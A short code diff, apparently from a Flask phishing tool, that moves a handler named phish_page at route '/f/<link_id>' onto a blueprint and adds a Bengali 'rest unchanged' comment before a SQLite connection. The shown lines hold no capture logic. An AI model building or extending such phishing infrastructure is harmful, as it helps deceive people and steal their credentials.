@@ -1,5 +1,6 @@
-@app.route('/f/<link_id>', methods=['GET', 'POST'])
+@bp.route('/f/<link_id>', methods=['GET', 'POST'])   # ✅ @app না, @bp
 def phish_page(link_id):
+    # ... বাকি কোড আগের মতো
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
     
